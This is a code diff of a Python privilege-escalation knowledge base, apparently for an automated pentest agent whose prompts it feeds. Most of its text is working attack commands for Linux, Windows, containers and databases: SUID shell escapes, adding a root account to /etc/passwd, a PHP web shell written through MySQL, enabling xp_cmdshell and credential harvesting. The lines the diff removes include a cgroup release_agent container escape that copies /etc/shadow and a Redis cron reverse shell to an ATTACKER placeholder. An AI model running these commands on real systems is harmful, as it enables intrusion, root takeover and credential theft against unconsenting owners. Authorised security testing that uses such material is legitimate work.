@@ -1,11 +1,11 @@
-"""Privilege escalation knowledge base — Linux and Windows privesc.
+"""Privilege escalation knowledge base.
 
-Deep knowledge about privilege escalation techniques:
+Deep knowledge about privilege escalation:
 1. Linux privilege escalation
 2. Windows privilege escalation
-3. Container escape
+3. Docker/container privilege escalation
 4. Database privilege escalation
-5. Application-level privilege escalation
+5. Application privilege escalation
 """
 
 from __future__ import annotations
@@ -21,22 +21,21 @@ logger = structlog.get_logger()
 
 @dataclass
 class PrivescPattern:
-    """A privilege escalation pattern with methodology."""
+    """A privilege escalation pattern."""
     pattern_id: str = ""
     name: str = ""
-    platform: str = ""            # linux, windows, container, database
-    severity: str = "critical"
+    platform: str = ""
+    severity: str = "high"
+    mitre_technique: str = ""
     description: str = ""
     testing_methodology: str = ""
     tools: list[str] = field(default_factory=list)
-    mitre_technique: str = ""
 
     def to_dict(self) -> dict[str, Any]:
         return {
             "id": self.pattern_id,
             "name": self.name[:30],
             "platform": self.platform[:10],
-            "mitre": self.mitre_technique[:12],
         }
 
 
@@ -44,182 +43,214 @@ PRIVESC_PATTERNS: list[dict[str, Any]] = [
     {
         "id": "pe-001", "name": "Linux Privilege Escalation",
         "platform": "linux", "severity": "critical",
-        "mitre": "T1548",
+        "mitre": "T1068",
         "desc": "Linux local privilege escalation techniques.",
         "testing": (
             "LINUX PRIVILEGE ESCALATION:\n"
-            "1. SUID/SGID BINARIES:\n"
-            "   find / -perm -4000 -type f 2>/dev/null  # SUID\n"
-            "   find / -perm -2000 -type f 2>/dev/null  # SGID\n"
-            "   Cross-reference with GTFOBins: https://gtfobins.github.io/\n"
-            "   Common exploitable: find, vim, python, perl, nmap, less, awk\n"
-            "2. SUDO MISCONFIGURATIONS:\n"
-            "   sudo -l  # List allowed commands\n"
-            "   Exploitable patterns:\n"
-            "   - (ALL) NOPASSWD: ALL → instant root\n"
-            "   - env_keep += LD_PRELOAD → LD_PRELOAD hijacking\n"
-            "   - Wildcard in path: /usr/bin/* → path traversal\n"
-            "   - Specific commands: Check GTFOBins for sudo abuse\n"
-            "   - sudo version < 1.8.28 → CVE-2019-14287 (sudo -u#-1 bash)\n"
-            "3. KERNEL EXPLOITS:\n"
-            "   uname -a  # Check kernel version\n"
-            "   Notable: DirtyPipe (CVE-2022-0847, 5.8-5.16.11),\n"
-            "   DirtyCow (CVE-2016-5195, < 4.8.3),\n"
-            "   PwnKit (CVE-2021-4034, polkit),\n"
-            "   Looney Tunables (CVE-2023-4911, glibc)\n"
-            "   linux-exploit-suggester.sh or linux-exploit-suggester-2.pl\n"
+            "1. ENUMERATION:\n"
+            "   - System info:\n"
+            "     uname -a\n"
+            "     cat /etc/os-release\n"
+            "     cat /proc/version\n"
+            "   - Current user:\n"
+            "     id\n"
+            "     whoami\n"
+            "     sudo -l (check sudo permissions)\n"
+            "   - Automated enumeration:\n"
+            "     ./linpeas.sh\n"
+            "     ./linux-exploit-suggester.sh\n"
+            "2. SUID/SGID BINARIES:\n"
+            "   - Find SUID: find / -perm -4000 2>/dev/null\n"
+            "   - Find SGID: find / -perm -2000 2>/dev/null\n"
+            "   - GTFOBins lookup for each SUID binary\n"
+            "   - Common exploitable SUID:\n"
+            "     * find: find . -exec /bin/bash -p \\;\n"
+            "     * vim: vim -c ':!/bin/bash'\n"
+            "     * python: python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n"
+            "     * nmap (old): nmap --interactive → !sh\n"
+            "     * pkexec: CVE-2021-4034 (PwnKit)\n"
+            "3. SUDO ABUSE:\n"
+            "   - sudo -l (list allowed commands)\n"
+            "   - GTFOBins for each allowed command\n"
+            "   - sudo with LD_PRELOAD:\n"
+            "     If env_keep += LD_PRELOAD\n"
+            "   - sudo with LD_LIBRARY_PATH\n"
+            "   - CVE-2021-3156 (Baron Samedit)\n"
             "4. CRON JOBS:\n"
-            "   cat /etc/crontab\n"
-            "   ls -la /etc/cron.*\n"
-            "   crontab -l\n"
-            "   Writable cron scripts? PATH manipulation in cron?\n"
-            "   Wildcard injection: tar with --checkpoint\n"
-            "5. CAPABILITIES:\n"
-            "   getcap -r / 2>/dev/null\n"
-            "   Dangerous: cap_setuid, cap_setgid, cap_dac_override,\n"
-            "   cap_net_raw, cap_sys_admin, cap_sys_ptrace\n"
-            "   Python with cap_setuid: import os; os.setuid(0); os.system('/bin/bash')\n"
-            "6. WRITABLE FILES:\n"
-            "   - /etc/passwd (add root user)\n"
-            "   - /etc/shadow (replace root hash)\n"
-            "   - /etc/sudoers\n"
-            "   - Shared library paths (LD hijacking)\n"
-            "   - systemd service files\n"
-            "7. AUTOMATED:\n"
-            "   linPEAS.sh, LinEnum.sh, linux-smart-enumeration"
+            "   - cat /etc/crontab\n"
+            "   - ls -la /etc/cron.d/\n"
+            "   - Writable cron scripts\n"
+            "   - Wildcard injection in cron commands\n"
+            "   - PATH abuse in cron\n"
+            "5. WRITABLE FILES:\n"
+            "   - /etc/passwd writable:\n"
+            "     echo 'root2:$(openssl passwd pass):0:0::/root:/bin/bash' >> /etc/passwd\n"
+            "   - /etc/shadow readable → crack hashes\n"
+            "   - Writable service files\n"
+            "   - Writable PATH directories\n"
+            "6. KERNEL EXPLOITS:\n"
+            "   - Dirty Pipe (CVE-2022-0847): Linux 5.8+\n"
+            "   - Dirty COW (CVE-2016-5195): Linux <4.8.3\n"
+            "   - PwnKit (CVE-2021-4034): pkexec in polkit\n"
+            "   - linux-exploit-suggester.sh\n"
+            "7. CAPABILITIES:\n"
+            "   - getcap -r / 2>/dev/null\n"
+            "   - cap_setuid on python/perl/node → root shell\n"
+            "   - cap_dac_read_search → read any file\n"
+            "   - cap_net_raw → packet capture"
         ),
-        "tools": ["linPEAS", "LinEnum", "pspy", "linux-exploit-suggester"],
+        "tools": ["linpeas", "linux-exploit-suggester", "GTFOBins"],
     },
     {
         "id": "pe-002", "name": "Windows Privilege Escalation",
         "platform": "windows", "severity": "critical",
-        "mitre": "T1548,T1134",
+        "mitre": "T1068",
         "desc": "Windows local privilege escalation techniques.",
         "testing": (
             "WINDOWS PRIVILEGE ESCALATION:\n"
-            "1. SERVICE MISCONFIGURATIONS:\n"
+            "1. ENUMERATION:\n"
+            "   - System info:\n"
+            "     systeminfo\n"
+            "     whoami /priv\n"
+            "     whoami /groups\n"
+            "   - Automated:\n"
+            "     winPEAS.exe\n"
+            "     PowerUp.ps1\n"
+            "     Seatbelt.exe\n"
+            "2. TOKEN PRIVILEGES:\n"
+            "   - SeImpersonatePrivilege (service accounts):\n"
+            "     * JuicyPotato (Win<2019)\n"
+            "     * PrintSpoofer\n"
+            "     * GodPotato\n"
+            "     * SweetPotato\n"
+            "   - SeBackupPrivilege:\n"
+            "     * Copy SAM/SYSTEM hives\n"
+            "     * robocopy /b\n"
+            "   - SeRestorePrivilege:\n"
+            "     * Replace system files\n"
+            "   - SeDebugPrivilege:\n"
+            "     * Inject into system processes\n"
+            "3. SERVICE EXPLOITATION:\n"
             "   - Unquoted service paths:\n"
-            "     wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\"\n"
-            "     If path has spaces without quotes → binary planting\n"
-            "   - Weak service permissions:\n"
-            "     accesschk.exe -uwcqv * /accepteula\n"
-            "     SERVICE_CHANGE_CONFIG → replace binary\n"
-            "   - Service binary permissions:\n"
-            "     icacls C:\\path\\to\\service.exe\n"
-            "     Writable? Replace with reverse shell\n"
-            "2. REGISTRY AUTORUNS:\n"
-            "   reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n"
-            "   If target binary is writable → replace with payload\n"
-            "   AlwaysInstallElevated:\n"
-            "   reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n"
-            "   reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n"
-            "   Both = 1 → Any MSI installs as SYSTEM\n"
-            "3. TOKEN MANIPULATION:\n"
-            "   - SeImpersonatePrivilege → Potato attacks\n"
-            "     JuicyPotato, PrintSpoofer, GodPotato, SweetPotato\n"
-            "   - SeBackupPrivilege → Read any file (SAM, SYSTEM)\n"
-            "   - SeRestorePrivilege → Write any file\n"
-            "   - SeTakeOwnershipPrivilege → Own any file\n"
-            "   - SeLoadDriverPrivilege → Load kernel driver\n"
-            "4. DLL HIJACKING:\n"
-            "   - Missing DLLs in search path\n"
-            "   - procmon.exe: Filter for NAME NOT FOUND + .dll\n"
-            "   - Place malicious DLL in writable search path\n"
-            "5. UAC BYPASS:\n"
-            "   - Auto-elevate binaries: fodhelper.exe, eventvwr.exe\n"
-            "   - Environment variable: windir manipulation\n"
-            "   - DLL side-loading via trusted process\n"
-            "6. AUTOMATED:\n"
-            "   winPEAS.exe, PowerUp.ps1, Seatbelt.exe, SharpUp.exe"
+            "     wmic service get name,pathname | findstr /i /v \"C:\\Windows\"\n"
+            "   - Writable service binaries:\n"
+            "     icacls {service_path}\n"
+            "   - Service DLL hijacking:\n"
+            "     Procmon → filter DLL NOT FOUND\n"
+            "   - Service registry permissions:\n"
+            "     accesschk.exe /accepteula -kvuqsw hklm\\system\\currentcontrolset\\services\n"
+            "4. REGISTRY:\n"
+            "   - AlwaysInstallElevated:\n"
+            "     reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n"
+            "     reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n"
+            "     If both = 1 → msfvenom MSI payload\n"
+            "   - Autologon credentials:\n"
+            "     reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'\n"
+            "5. SCHEDULED TASKS:\n"
+            "   - schtasks /query /fo LIST /v\n"
+            "   - Writable task scripts\n"
+            "   - Task binaries in writable directories\n"
+            "6. CREDENTIAL HARVESTING:\n"
+            "   - Saved credentials:\n"
+            "     cmdkey /list\n"
+            "     runas /savecred /user:admin cmd\n"
+            "   - Unattend.xml / sysprep files:\n"
+            "     findstr /si password *.xml *.ini *.txt\n"
+            "   - WiFi passwords:\n"
+            "     netsh wlan show profiles\n"
+            "     netsh wlan show profile {name} key=clear\n"
+            "7. UAC BYPASS:\n"
+            "   - fodhelper.exe\n"
+            "   - eventvwr.exe\n"
+            "   - sdclt.exe\n"
+            "   - UACME project: 70+ methods"
         ),
-        "tools": ["winPEAS", "PowerUp", "Seatbelt", "SharpUp", "accesschk"],
+        "tools": ["winPEAS", "PowerUp", "Seatbelt", "GodPotato", "PrintSpoofer"],
     },
     {
-        "id": "pe-003", "name": "Container Privilege Escalation",
-        "platform": "container", "severity": "critical",
-        "mitre": "T1611",
-        "desc": "Container escape and privilege escalation.",
-        "testing": (
-            "CONTAINER PRIVILEGE ESCALATION:\n"
-            "1. DETECT CONTAINER:\n"
-            "   - Check /.dockerenv or /run/.containerenv\n"
-            "   - cat /proc/1/cgroup | grep -i docker\n"
-            "   - hostname → random string usually means container\n"
-            "2. PRIVILEGED CONTAINER:\n"
-            "   - Check: cat /proc/self/status | grep CapEff\n"
-            "   - CapEff: 000001ffffffffff = all capabilities = privileged\n"
-            "   - Mount host filesystem:\n"
-            "     mkdir /mnt/host && mount /dev/sda1 /mnt/host\n"
-            "     chroot /mnt/host → root on host\n"
-            "3. DOCKER SOCKET:\n"
-            "   - ls -la /var/run/docker.sock\n"
-            "   - If accessible: docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host\n"
-            "   - curl --unix-socket /var/run/docker.sock http://localhost/containers/json\n"
-            "4. CAPABILITIES ABUSE:\n"
-            "   - CAP_SYS_ADMIN:\n"
-            "     Mount cgroup: release_agent RCE\n"
-            "     d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -1))\n"
-            "     mkdir -p $d/exploit && echo 1 > $d/exploit/notify_on_release\n"
-            "     echo '#!/bin/bash' > /cmd && echo 'cat /etc/shadow > /output' >> /cmd\n"
-            "     host_path=$(sed -n 's/.*upperdir=\\([^,]*\\).*/\\1/p' /etc/mtab)\n"
-            "     echo \"$host_path/cmd\" > $d/exploit/release_agent\n"
-            "   - CAP_NET_RAW: Packet sniffing on host network\n"
-            "   - CAP_SYS_PTRACE: Attach to host processes\n"
-            "5. KERNEL EXPLOITS:\n"
-            "   - Container shares kernel with host\n"
-            "   - DirtyPipe, DirtyCow work from container too\n"
-            "6. SENSITIVE MOUNTS:\n"
-            "   - /proc/sysrq-trigger\n"
-            "   - /sys/kernel/uevent_helper\n"
-            "   - /dev with raw disk access"
-        ),
-        "tools": ["deepce", "CDK", "amicontained"],
-    },
-    {
-        "id": "pe-004", "name": "Database Privilege Escalation",
+        "id": "pe-003", "name": "Database Privilege Escalation",
         "platform": "database", "severity": "high",
-        "mitre": "T1505",
-        "desc": "Database-specific privilege escalation techniques.",
+        "mitre": "T1078",
+        "desc": "Database privilege escalation.",
         "testing": (
             "DATABASE PRIVILEGE ESCALATION:\n"
-            "1. MySQL/MariaDB:\n"
+            "1. MYSQL:\n"
             "   - UDF (User Defined Functions):\n"
-            "     Create function sys_exec from shared library\n"
-            "     SELECT sys_exec('id > /tmp/out')\n"
-            "   - FILE privilege → read/write files:\n"
-            "     SELECT LOAD_FILE('/etc/passwd')\n"
-            "     SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/shell.php'\n"
-            "   - CVE-2016-6662: MySQL remote root via malloc_lib\n"
-            "   - MySQL running as root? → direct system access\n"
-            "2. PostgreSQL:\n"
-            "   - COPY command → read/write files (superuser required)\n"
-            "     COPY (SELECT '') TO PROGRAM 'id'\n"
-            "   - pg_execute_server_program (v9.3+)\n"
-            "   - Large objects → read arbitrary files:\n"
-            "     SELECT lo_import('/etc/passwd')\n"
-            "   - Extensions: plpythonu, plperlu → code execution\n"
-            "     CREATE EXTENSION plpythonu;\n"
-            "     CREATE FUNCTION exec() RETURNS text AS $$\n"
-            "       import os; return os.popen('id').read()\n"
-            "     $$ LANGUAGE plpythonu;\n"
+            "     Create shared library with system() function\n"
+            "     select @@plugin_dir;\n"
+            "     CREATE FUNCTION sys_exec RETURNS STRING SONAME 'raptor_udf2.so';\n"
+            "     SELECT sys_exec('id');\n"
+            "   - File read/write:\n"
+            "     SELECT LOAD_FILE('/etc/passwd');\n"
+            "     SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/shell.php';\n"
+            "   - Check: SELECT @@secure_file_priv;\n"
+            "2. POSTGRESQL:\n"
+            "   - COPY command:\n"
+            "     COPY (SELECT '') TO PROGRAM 'id';\n"
+            "   - Large Objects:\n"
+            "     SELECT lo_import('/etc/passwd');\n"
+            "   - Extension exploit:\n"
+            "     CREATE EXTENSION IF NOT EXISTS dblink;\n"
+            "     SELECT dblink_connect(...);\n"
             "3. MSSQL:\n"
-            "   - xp_cmdshell (disabled by default, can re-enable if sysadmin):\n"
+            "   - xp_cmdshell:\n"
+            "     EXEC sp_configure 'show advanced options', 1; RECONFIGURE;\n"
             "     EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n"
-            "     EXEC xp_cmdshell 'whoami'\n"
-            "   - OPENROWSET / linked servers → pivot to other databases\n"
-            "   - Impersonation: EXECUTE AS LOGIN = 'sa'\n"
-            "   - CLR assembly → custom .NET code execution\n"
-            "4. Redis:\n"
-            "   - No auth by default! Check: redis-cli -h target\n"
-            "   - Write to crontab:\n"
-            "     CONFIG SET dir /var/spool/cron/\n"
-            "     CONFIG SET dbfilename root\n"
-            "     SET payload '\\n*/1 * * * * /bin/bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\\n'\n"
-            "     SAVE\n"
-            "   - Write SSH key → authorized_keys\n"
-            "   - Module loading (Redis 4.0+): MODULE LOAD /path/to/module.so"
+            "     EXEC xp_cmdshell 'whoami';\n"
+            "   - Linked servers:\n"
+            "     EXEC sp_linkedservers;\n"
+            "     SELECT * FROM OPENQUERY(linked_server, 'SELECT @@version');\n"
+            "   - Impersonation:\n"
+            "     EXECUTE AS LOGIN = 'sa';\n"
+            "4. ORACLE:\n"
+            "   - Java privilege escalation:\n"
+            "     GRANT JAVAUSERPRIV TO user;\n"
+            "   - DBMS_SCHEDULER for OS commands\n"
+            "   - UTL_FILE for file access"
         ),
-        "tools": ["sqlmap", "redis-cli", "mssqlclient.py"],
+        "tools": ["sqlmap --os-shell", "sqsh", "mssqlclient.py"],
+    },
+    {
+        "id": "pe-004", "name": "Application Privilege Escalation",
+        "platform": "application", "severity": "high",
+        "mitre": "T1078",
+        "desc": "Application-level privilege escalation.",
+        "testing": (
+            "APPLICATION PRIVILEGE ESCALATION:\n"
+            "1. ROLE MANIPULATION:\n"
+            "   - Parameter tampering:\n"
+            "     POST body: role=admin, is_admin=true\n"
+            "   - JWT claims modification:\n"
+            "     Decode → Change 'role': 'user' → 'admin' → Re-encode\n"
+            "   - Cookie manipulation:\n"
+            "     Set-Cookie: role=admin\n"
+            "2. IDOR:\n"
+            "   - Horizontal escalation:\n"
+            "     /api/users/123/settings → /api/users/456/settings\n"
+            "   - Vertical escalation:\n"
+            "     /api/user/profile → /api/admin/settings\n"
+            "   - Object reference in body:\n"
+            "     {\"user_id\": 456} (change to another user)\n"
+            "3. FORCED BROWSING:\n"
+            "   - Admin panels:\n"
+            "     /admin, /administrator, /manage, /dashboard\n"
+            "   - Debug endpoints:\n"
+            "     /debug, /console, /actuator, /_debug\n"
+            "   - API versioning:\n"
+            "     /api/v1/admin (old, less secured)\n"
+            "4. FUNCTION LEVEL:\n"
+            "   - HTTP method override:\n"
+            "     X-HTTP-Method-Override: DELETE\n"
+            "     X-Method-Override: PUT\n"
+            "   - Content-Type switch:\n"
+            "     application/json → application/xml (XXE)\n"
+            "5. MULTI-STEP:\n"
+            "   - Skip approval steps in workflows\n"
+            "   - Replay successful authorization tokens\n"
+            "   - Race condition on privilege grant\n"
+            "   - TOCTOU (Time-of-check to time-of-use)"
+        ),
+        "tools": ["Burp Suite", "ffuf", "jwt_tool", "Autorize (Burp extension)"],
     },
 ]
 
@@ -227,8 +258,8 @@ PRIVESC_PATTERNS: list[dict[str, Any]] = [
 class PrivescKB:
     """Privilege escalation knowledge base.
 
-    Provides deep privesc methodology injected into
-    agent prompts for post-exploitation assessment.
+    Provides privilege escalation methodology
+    injected into agent prompts.
     """
 
     def __init__(self) -> None:
@@ -237,17 +268,17 @@ class PrivescKB:
         self._load_patterns()
 
     def _load_patterns(self) -> None:
-        """Load privesc patterns."""
+        """Load privilege escalation patterns."""
         for data in PRIVESC_PATTERNS:
             pattern = PrivescPattern(
                 pattern_id=data["id"],
                 name=data["name"],
                 platform=data.get("platform", ""),
-                severity=data.get("severity", "critical"),
+                severity=data.get("severity", "high"),
+                mitre_technique=data.get("mitre", ""),
                 description=data.get("desc", ""),
                 testing_methodology=data.get("testing", ""),
                 tools=data.get("tools", []),
-                mitre_technique=data.get("mitre", ""),
             )
             self._patterns[pattern.pattern_id] = pattern
 
@@ -261,55 +292,25 @@ class PrivescKB:
             if p.platform == platform
         ]
 
-    def get_testing_prompts(
+    def build_privesc_prompt(
         self,
         platforms: list[str] | None = None,
         max_patterns: int = 3,
-    ) -> list[str]:
-        """Get testing prompts for agent context injection."""
-        prompts = []
+    ) -> str:
+        """Build privilege escalation prompt."""
+        lines = ["## Privilege Escalation\n"]
+        count = 0
         for pattern in self._patterns.values():
             if platforms and pattern.platform not in platforms:
                 continue
-            if pattern.testing_methodology:
-                prompts.append(pattern.testing_methodology)
-            if len(prompts) >= max_patterns:
+            if count >= max_patterns:
                 break
-        return prompts
-
-    def detect_platform(self, text: str) -> str:
-        """Detect target platform from context."""
-        text_lower = text.lower()
-        if any(kw in text_lower for kw in ["linux", "ubuntu", "centos", "debian", "rhel", "fedora"]):
-            return "linux"
-        if any(kw in text_lower for kw in ["windows", "win32", "powershell", "cmd.exe"]):
-            return "windows"
-        if any(kw in text_lower for kw in ["docker", "container", "kubernetes", "k8s"]):
-            return "container"
-        if any(kw in text_lower for kw in ["mysql", "postgres", "mssql", "redis", "mongodb"]):
-            return "database"
-        return ""
-
-    def build_privesc_prompt(
-        self,
-        platform: str = "",
-        max_patterns: int = 2,
-    ) -> str:
-        """Build privesc testing prompt."""
-        relevant = []
-        if platform:
-            relevant = self.get_patterns_for_platform(platform)
-        else:
-            relevant = list(self._patterns.values())
-
-        lines = ["## Privilege Escalation Testing\n"]
-        for pattern in relevant[:max_patterns]:
             lines.append(f"### {pattern.name} [{pattern.severity.upper()}]")
             if pattern.mitre_technique:
-                lines.append(f"MITRE ATT&CK: {pattern.mitre_technique}")
+                lines.append(f"MITRE: {pattern.mitre_technique}")
             lines.append(pattern.testing_methodology)
             lines.append("")
-
+            count += 1
         return "\n".join(lines)
 
     def get_stats(self) -> dict[str, Any]:
